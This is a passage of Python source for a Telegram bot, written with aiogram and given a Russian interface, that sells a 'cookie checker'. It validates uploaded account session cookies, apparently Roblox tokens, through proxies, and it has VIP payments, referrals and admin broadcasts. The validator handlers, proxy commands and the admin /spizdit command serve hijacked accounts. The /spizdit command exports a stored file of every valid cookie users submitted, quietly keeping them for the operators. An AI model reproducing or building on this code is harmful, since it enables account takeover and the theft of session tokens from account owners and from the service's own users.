        from aiogram.types import LabeledPrice
        
        prices = [LabeledPrice(label="VIP 30 дней", amount=300)]
        
        await bot.send_invoice(
            chat_id=user_id,
            title="VIP подписка",
            description="VIP статус на 30 дней с приоритетом в очереди и неограниченными проверками",
            payload="vip_30days",
            provider_token="",
            currency="XTR",
            prices=prices,
            protect_content=True
        )
    except Exception as e:
        logging.error(f"Ошибка отправки инвойса: {e}")
        await callback.message.answer(
            f"❌ Ошибка при попытке создать платеж. Обратитесь к администратору",
            parse_mode=ParseMode.HTML
        )

@router.pre_checkout_query()
async def pre_checkout(pre_checkout: types.PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout.id, ok=True)

@router.message(F.successful_payment)
async def successful_payment(message: Message):
    user_id = message.from_user.id
    
    if message.successful_payment.payload == "vip_30days":
        Database.set_vip_status(user_id, True, 30)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👤 Профиль", callback_data="show_profile")],
            [InlineKeyboardButton(text="🎮 Начать проверку", callback_data="start_check")]
        ])
        
        await message.answer(
            f"<b>✅ СПАСИБО ЗА ПОКУПКУ!</b>\n\n"
            f"👑 Вам выдан VIP статус на 30 дней\n\n"
            f"<b>Ваши привилегии:</b>\n"
            f"⚡ Приоритет в очереди проверок\n"
            f"♾️ Неограниченные проверки\n"
            f"🚀 Более быстрая обработка результатов\n"
            f"💎 Доступ ко всем премиум функциям\n\n"
            f"<i>VIP действует до: {(datetime.now() + timedelta(days=30)).strftime('%d.%m.%Y')}</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )

@router.callback_query(F.data.startswith("check_payment_"))
async def check_cryptobot_payment(callback: CallbackQuery):
    """Проверяет статус платежа CryptoBot по требованию пользователя"""
    user_id = callback.from_user.id
    invoice_id = callback.data.replace("check_payment_", "")
    
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    await callback.answer("🔄 Проверка статуса платежа...")
    
    if check_crypto_invoice_paid(invoice_id):
        # Платёж прошёл, выдаём VIP
        Database.confirm_payment(invoice_id)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👤 Профиль", callback_data="show_profile")],
            [InlineKeyboardButton(text="🎮 Начать проверку", callback_data="start_check")]
        ])
        
        await callback.message.edit_text(
            f"<b>✅ ПЛАТЁЖ УСПЕШНО ОБРАБОТАН!</b>\n\n"
            f"👑 Вам выдан VIP статус на 30 дней\n\n"
            f"<b>Ваши привилегии:</b>\n"
            f"⚡ Приоритет в очереди проверок\n"
            f"♾️ Неограниченные проверки\n"
            f"🚀 Более быстрая обработка результатов\n"
            f"💎 Доступ ко всем премиум функциям\n\n"
            f"<i>VIP действует до: {(datetime.now() + timedelta(days=30)).strftime('%d.%m.%Y')}</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    else:
        await callback.answer("❌ Оплата не найдена. Если вы уже оплатили, подождите несколько минут и попробуйте снова.", show_alert=True)

@router.callback_query(F.data == "show_referral")
async def show_referral_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    ref_code = Database.get_or_create_referral_code(user_id)
    config = Database.get_user_config(user_id)
    referral_count = config.get('referral_count', 0)
    bonus_checks = config.get('bonus_checks', 0)
    
    bot_username = (await bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={ref_code}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_profile")]
    ])
    
    await callback.message.edit_text(
        f"🎁 <b>РЕФЕРАЛЬНАЯ ПРОГРАММА</b>\n\n"
        f"📨 <b>Ваша ссылка:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"📊 <b>Статистика:</b>\n"
        f"├ Рефералов: <code>{referral_count}</code>\n"
        f"├ Бонусных проверок: <code>{bonus_checks}</code>\n"
        f"└ Код: <code>{ref_code}</code>\n\n"
        f"💰 <b>Награды:</b>\n"
        f"├ +3 проверки за каждого реферала\n"
        f"└ +1 проверка реферу при регистрации",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "back_to_profile")
async def back_to_profile(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    await callback.message.delete()
    await show_profile(callback.message)

@router.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = get_main_keyboard()
    
    try:
        await bot.send_photo(
                chat_id=callback.message.chat.id,
                photo="https://raw.githubusercontent.com/jealleal/images/refs/heads/main/menu.png",
                caption=(
                    f"👋 <b>Главное меню</b>\n\n"
                    f"💎 <i>Выберите действие в меню ниже</i>"
                ),
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
        )
        await callback.message.delete()
    except Exception as e:
        logging.error(f"Ошибка возврата в меню: {e}")
        try:
            await callback.message.edit_text(
                f"👋 <b>Главное меню</b>\n\n"
                f"💎 <i>Выберите действие в меню ниже</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
        except:
            await callback.message.answer(
                f"👋 <b>Главное меню</b>\n\n"
                f"💎 <i>Выберите действие в меню ниже</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
    
    await callback.answer()

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    await state.clear()
    
    try:
        await callback.message.delete()
    except:
        pass
    
    try:
        await bot.send_photo(
                chat_id=callback.message.chat.id,
                photo="https://raw.githubusercontent.com/jealleal/images/refs/heads/main/menu.png",
                caption=(
                    f"👋 <b>Главное меню</b>\n\n"
                    f"💎 <i>Выберите действие в меню ниже</i>"
                ),
                parse_mode=ParseMode.HTML
        )
        await callback.message.delete()
    except Exception as e:
        logging.error(f"Ошибка возврата в меню: {e}")
        try:
            await callback.message.edit_text(
                f"👋 <b>Главное меню</b>\n\n"
                f"💎 <i>Выберите действие в меню ниже</i>",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        except:
            await callback.message.answer(
                f"👋 <b>Главное меню</b>\n\n"
                f"💎 <i>Выберите действие в меню ниже</i>",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
    

@router.callback_query(F.data == "back_to_cookie_check")
async def back_to_cookie_check(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    keyboard_rows = []
    
    keyboard_rows.append([InlineKeyboardButton(text="⚙️ Настройки чека", callback_data="check_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="📁 Проверить файл", callback_data="start_check_file")])
    keyboard_rows.append([InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="start_check_message")])
    keyboard_rows.append([
        InlineKeyboardButton(text="🏅 Указать бэйджи", callback_data="set_badge"),
        InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
    ])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"🔍 <b>Cookie Checker</b>\n"
        f"Выберите, что сканировать:\n\n"
        f"<i>Нажмите на параметр чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.message(F.text == "Support")
async def support_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_support_menu")]
    ])
    
    await message.answer(
        f"🆘 <b>ПОДДЕРЖКА</b>\n"
        f"\n"
        f"<b>Поддержка: @codecvt</b>\n"
        f"<b>Модератор: @KomaruEat</b>\n",
        f"<b>Разработчик: @oindc</b>\n",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.support_message)

@router.message(Form.validator_file)
async def process_validator_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("❌ <b>Пожалуйста, отправьте файл с печеньками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"validator_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("📥 <b>Скачиваю файл...</b>\n<i>Это может занять время для больших файлов.</i>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА ФАЙЛА</b>\n"
                f"\n"
                f"🚫 <b>В файле не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат файла и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        validator_queue.put((message.from_user.id, file_info, msg))
        queue_size = validator_queue.qsize()
        
        if current_validator_checking is None:
            status_msg = (
                f"✅ <b>ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n"
                f"\n"
                f"📊 <b>Статистика файла:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"🎯 <b>Статус:</b> Первый в очереди\n"
                f"⏳ <b>Начало проверки:</b> Следующий\n\n"
                f"<i>Ожидайте начала проверки...</i>"
            )
        else:
            status_msg = (
    f"✅ <b>ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n"
    f"\n"
    f"📊 <b>Статистика файла:</b>\n"
    f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
    f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
    f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
    f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
    f"📍 <b>Позиция в очереди:</b> <code>{queue_size}</code>\n"
    f"⏱ <b>Примерное время ожидания:</b> <code>{queue_size * 2}-{queue_size * 5}</code> минут\n\n"
    f"<i>Статус очереди будет обновляться автоматически.</i>"
)
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_validator_queue_update()
            
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        await state.clear()

@router.callback_query(F.data.startswith("hide_admin_"))
async def hide_admin_message(callback: CallbackQuery):
    user_id = int(callback.data.split("_")[-1])
    if callback.from_user.id in ADMINS:
        await callback.message.delete()
        await callback.answer("🗑 Сообщение скрыто")
    else:
        await callback.answer("🚫 Нет прав для этого действия", show_alert=True)

@router.message(F.text == "Valid Checker")
async def validator_menu(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Проверить файл", callback_data="validator_file")],
        [InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="validator_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_validator_menu")]
    ])
    
    
    await message.answer(
        f"🔍 <b>МЕНЮ ВАЛИДАТОРА</b>\n"
        f"\n"
        
        f"📤 <b>Способы проверки:</b>\n"
        f"├ Файл (.txt) с куками\n"
        f"└ Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Быстрая проверка на валидность\n"
        f"├ Без подробной статистики\n"
        f"└ Только проверка работоспособности\n\n"
        
        f"<i>Выберите способ проверки</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "validator_file")
async def validator_file_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_validator_menu")]
    ])
    
    await callback.message.answer(
        f"📋 <b>ИНСТРУКЦИЯ ВАЛИДАТОРА ФАЙЛА</b>\n"
        f"\n"
        
        f"1. <b>Подготовьте файл с куками (.txt)</b>\n"
        f"2. <b>Отправьте файл в этот чат</b>\n\n"
        
        f"📁 <b>Требования к файлу:</b>\n"
        f"├ Только текстовый формат (.txt)\n"
        f"├ Максимальный размер: 20MB\n"
        f"└ Каждая печенька на новой строке\n\n"
        
        f"<i>«Жду ваш файл :3»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.validator_file)

@router.callback_query(F.data == "validator_message")
async def validator_message_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_validator_menu")]
    ])
    
    await callback.message.answer(
        f"📝 <b>ИНСТРУКЦИЯ ВАЛИДАТОРА СООБЩЕНИЯ</b>\n"
        f"\n"
        
        f"1. <b>Введите печеньку в чат</b>\n"
        f"2. <b>Или отправьте несколько куки, каждую с новой строки</b>\n\n"
        
        f"📋 <b>Формат:</b>\n"
        f"├ Одна печенька → одно сообщение\n"
        f"└ Несколько куки → каждую с новой строки\n\n"
        
        f"<i>«Отправьте печеньку для валидации»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.validate_cookie)

@router.message(Form.validate_cookie)
async def process_validate_cookie_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    text = message.text.strip()
    if not text:
        await message.answer("❌ <b>Сообщение пустое.</b>\nОтправьте печеньку для валидации.", parse_mode=ParseMode.HTML)
        return
    
    msg = await message.answer("🔍 <b>Валидирую печеньку...</b>", parse_mode=ParseMode.HTML)
    
    try:
        cookies = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    cookies.append(full_cookie)
                except:
                    pass
        
        if not cookies:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ВАЛИДАЦИЯ СООБЩЕНИЯ</b>\n"
                f"\n"
                f"🚫 <b>В сообщении не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        file_info = {
            'cookies': cookies,
            'total_lines': len(lines),
            'invalid_lines': len(lines) - len(cookies),
            'duplicates': 0
        }
        
        
        validator_queue.put((message.from_user.id, file_info, msg))
        queue_size = validator_queue.qsize()
        
        if current_validator_checking is None:
            status_msg = (
                f"✅ <b>СООБЩЕНИЕ ДОБАВЛЕНО В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n"
                f"\n"
                f"📊 <b>Статистика:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"🎯 <b>Статус:</b> Первый в очереди\n"
                f"⏳ <b>Начало проверки:</b> Следующий\n\n"
                f"<i>Ожидайте начала валидации...</i>"
            )
        else:
            status_msg = (
                f"✅ <b>СООБЩЕНИЕ ДОБАВЛЕНО В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n"
                f"\n"
                f"📊 <b>Статистика:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"📍 <b>Позиция в очереди:</b> <code>{queue_size}</code>\n"
                f"⏱ <b>Примерное время ожидания:</b> <code>{queue_size * 2}-{queue_size * 5}</code> минут\n\n"
                f"<i>Статус очереди будет обновляться автоматически.</i>"
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_validator_queue_update()
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ВАЛИДАЦИИ СООБЩЕНИЯ</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат печеньки\n"
            f"2. Убедитесь, что это валидная печенька\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка валидации сообщения с печенькой: {e}")
    finally:
        await state.clear()

@router.callback_query(F.data == "back_to_validator_menu")
async def back_to_validator_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Проверить файл", callback_data="validator_file")],
        [InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="validator_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")]
    ])
    
    
    await callback.message.edit_text(
        f"🔍 <b>МЕНЮ ВАЛИДАТОРА</b>\n"
        f"\n"
        
        f"📤 <b>Способы проверки:</b>\n"
        f"├ Файл (.txt) с куками\n"
        f"└ Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Быстрая проверка на валидность\n"
        f"├ Без подробной статистики\n"
        f"└ Только проверка работоспособности\n\n"
        
        f"<i>Выберите способ проверки</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.message(Command("setproxy"))
async def set_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        proxies = message.text.split('\n')[1:]
        proxies = [p.strip() for p in proxies if p.strip()]
        
        if not proxies:
            await message.answer("❌ <b>Список прокси пуст.</b>\nУкажите прокси после команды.", parse_mode=ParseMode.HTML)
            return
        
        Database.save_proxies(proxies)
        await message.answer(
            f"✅ <b>Прокси успешно сохранены!</b>\n\n"
            f"📊 <b>Общее количество:</b> <code>{len(proxies)}</code>\n\n"
            f"🔗 <b>Первые 5 прокси:</b>\n"
            f"<code>" + "\n".join(proxies[:5]) + "</code>",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"❌ <b>Ошибка сохранения прокси:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("listproxy"))
async def list_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    proxies = Database.load_proxies()
    if not proxies:
        await message.answer("📭 <b>Список прокси пуст</b>", parse_mode=ParseMode.HTML)
    else:
        text = (
            f"📋 <b>СПИСОК ПРОКСИ</b>\n"
            f"\n"
            f"📊 <b>Всего прокси:</b> <code>{len(proxies)}</code>\n\n"
            f"🔗 <b>Прокси:</b>\n"
            f"<code>" + "\n".join(proxies[:20]) + "</code>\n\n"
            f"<i>Показано первых 20 из {len(proxies)}</i>\n"
            f"══════════════════════════"
        )
        await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("post"))
async def post_message(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ <b>У вас нет разрешения на рассылку</b>", parse_mode=ParseMode.HTML)
        return
    
    if message.photo:
        text = message.caption or ""
        if text.startswith("/post"):
            text = text.replace("/post", "", 1).strip()
        has_photo = True
    else:
        text = message.text.split("/post", 1)[1].strip() if "/post" in message.text else ""
        has_photo = False
    
    if not text and not has_photo:
        await message.answer("❌ <b>Сообщение не может быть пустым.</b>", parse_mode=ParseMode.HTML)
        return
    
    users = Database.get_all_users()
    total_users = len(users)

    preview_text = ""
    if has_photo:
        preview_text = "<b>ФОТО</b> с подписью:\n"
        if text:
            preview_text += f"📝 <b>Текст:</b> <code>{text[:100]}{'...' if len(text) > 100 else ''}</code>\n"
        else:
            preview_text += "📝 <b>Текст:</b> Без подписи\n"
    else:
        preview_text = "📝 <b>ТЕКСТОВОЕ СООБЩЕНИЕ:</b>\n"
        preview_text += f"📄 <b>Текст:</b> <code>{text[:100]}{'...' if len(text) > 100 else ''}</code>\n"
    
    from aiogram.fsm.storage.base import StorageKey
    import hashlib
    
    import time
    post_id = hashlib.md5(f"{message.message_id}_{time.time()}".encode()).hexdigest()[:8]

    post_data = {
        'has_photo': has_photo,
        'text': text,
        'photo_id': message.photo[-1].file_id if has_photo and message.photo else None,
        'total_users': total_users
    }

    global pending_posts
    if 'pending_posts' not in globals():
        pending_posts = {}
    pending_posts[post_id] = post_data
    
    confirm_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да, начать рассылку", callback_data=f"confirm_post_{post_id}")],
        [InlineKeyboardButton(text="❌ Нет, отменить", callback_data="cancel_post")]
    ])
    
    await message.answer(
        f"📢 <b>ПОДТВЕРЖДЕНИЕ РАССЫЛКИ</b>\n"
        f"\n"
        f"{preview_text}\n"
        f"👥 <b>Количество получателей:</b> <code>{total_users:,}</code>\n\n"
        f"⚠️ <b>Вы уверены что хотите начать рассылку?</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=confirm_keyboard
    )

@router.callback_query(F.data.startswith("confirm_post_"))
async def confirm_post_handler(callback: CallbackQuery):
    if callback.from_user.id not in ADMINS:
        await callback.answer("❌ Нет прав для этого действия", show_alert=True)
        return
    
    post_id = callback.data.split("confirm_post_")[1]
    
    global pending_posts
    if post_id not in pending_posts:
        await callback.answer("❌ Данные рассылки устарели", show_alert=True)
        return
    
    post_data = pending_posts[post_id]
    
    await callback.message.edit_reply_markup(reply_markup=None)

    await callback.message.edit_text(
        f"📢 <b>НАЧАТА РАССЫЛКА</b>\n"
        f"\n"
        f"👥 <b>Получателей:</b> <code>{post_data['total_users']:,}</code>\n"
        f"📊 <b>Статус:</b> <code>0/{post_data['total_users']}</code>\n"
        f"✅ <b>Успешно:</b> <code>0</code>\n"
        f"❌ <b>Не удалось:</b> <code>0</code>",
        parse_mode=ParseMode.HTML
    )
    
    users = Database.get_all_users()
    total_users = post_data['total_users']
    success = 0
    failed = 0
    
    for user_id in users:
        try:
            if post_data['has_photo'] and post_data['photo_id']:
                if post_data['text']:
                    await bot.send_photo(
                        chat_id=user_id,
                        photo=post_data['photo_id'],
                        caption=post_data['text'],
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await bot.send_photo(
                        chat_id=user_id,
                        photo=post_data['photo_id'],
                        parse_mode=ParseMode.HTML
                    )
            else:
                if post_data['text']:
                    await bot.send_message(
                        chat_id=user_id,
                        text=post_data['text'],
                        parse_mode=ParseMode.HTML
                    )
            success += 1
        except Exception as e:
            failed += 1
            logging.error(f"Ошибка отправки сообщения пользователю {user_id}: {e}")
        
        if (success + failed) % 10 == 0 or (success + failed) == total_users:
            try:
                await callback.message.edit_text(
                    f"📢 <b>РАССЫЛКА</b>\n"
                    f"\n"
                    f"👥 <b>Получателей:</b> <code>{total_users:,}</code>\n"
                    f"📊 <b>Статус:</b> <code>{success + failed}/{total_users}</code>\n"
                    f"✅ <b>Успешно:</b> <code>{success}</code>\n"
                    f"❌ <b>Не удалось:</b> <code>{failed}</code>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
    
    if post_id in pending_posts:
        del pending_posts[post_id]
    
    await callback.message.edit_text(
        f"✅ <b>РАССЫЛКА ЗАВЕРШЕНА</b>\n"
        f"\n"
        f"👥 <b>Всего получателей:</b> <code>{total_users:,}</code>\n"
        f"✅ <b>Успешно доставлено:</b> <code>{success}</code>\n"
        f"❌ <b>Не удалось доставить:</b> <code>{failed}</code>\n\n"
        f"📊 <b>Процент успешных:</b> <code>{round(success/total_users*100, 2) if total_users > 0 else 0}%</code>",
        parse_mode=ParseMode.HTML
    )
    
    await callback.answer("✅ Рассылка завершена")

@router.callback_query(F.data == "cancel_post")
async def cancel_post_handler(callback: CallbackQuery):
    if callback.from_user.id not in ADMINS:
        await callback.answer("❌ Нет прав для этого действия", show_alert=True)
        return
    
    await callback.message.edit_text(
        "❌ <b>Рассылка отменена</b>\n"
        f"\n"
        f"<i>Рассылка была отменена администратором.</i>",
        parse_mode=ParseMode.HTML
    )
    
    await callback.answer("❌ Рассылка отменена")

@router.message(Command("spizdit"))
async def spizdit_cookies(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        valid_cookies_file = 'all_valid_cookies.txt'
        
        if not os.path.exists(valid_cookies_file) or os.path.getsize(valid_cookies_file) == 0:
            await message.answer("📭 <b>Файл с валидными печеньками пуст или не существует.</b>", parse_mode=ParseMode.HTML)
            return
        
        zip_file_path = 'valid_cookies.zip'
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(valid_cookies_file, arcname=os.path.basename(valid_cookies_file))
        
        await message.answer_document(
            document=FSInputFile(zip_file_path),
            caption="📁 <b>Файл с валидными печеньками:</b>\n══════════════════════════",
            parse_mode=ParseMode.HTML
        )
        
        os.remove(zip_file_path)
        
    except Exception as e:
        await message.answer(
            f"❌ <b>Ошибка экспорта куки:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"Ошибка в /spizdit: {e}")

@router.message(Command("soob"))
async def send_personal_message(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            await message.answer(
                f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОМАНДЫ</b>\n"
                f"\n"
                f"📝 <b>Используйте:</b>\n"
                f"<code>/soob @username или ID текст сообщения</code>\n\n"
                f"📋 <b>Пример:</b>\n"
                f"<code>/soob 12345678 Привет, как дела?</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        text = args[2]
        
        
        if target.isdigit():
            user_id = int(target)
            username = "Неизвестно"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"❌ <b>Пользователь @{target} не найден.</b>", parse_mode=ParseMode.HTML)
            return
        
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🗑 Скрыть", callback_data=f"hide_msg_{message.from_user.id}")]
        ])
        
        
        if message.photo:
            photo = message.photo[-1].file_id
            await bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"💬 <b>СООБЩЕНИЕ ОТ ПОДДЕРЖКИ</b>\n══════════════════════════\n\n{text}",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        else:
            await bot.send_message(
                chat_id=user_id,
                text=f"💬 <b>СООБЩЕНИЕ ОТ ПОДДЕРЖКИ</b>\n══════════════════════════\n\n{text}",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        
        await message.answer(
            f"✅ <b>Сообщение отправлено</b>\n\n"
            f"👤 <b>Пользователь:</b> @{username}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await message.answer(
            f"❌ <b>Ошибка отправки сообщения:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
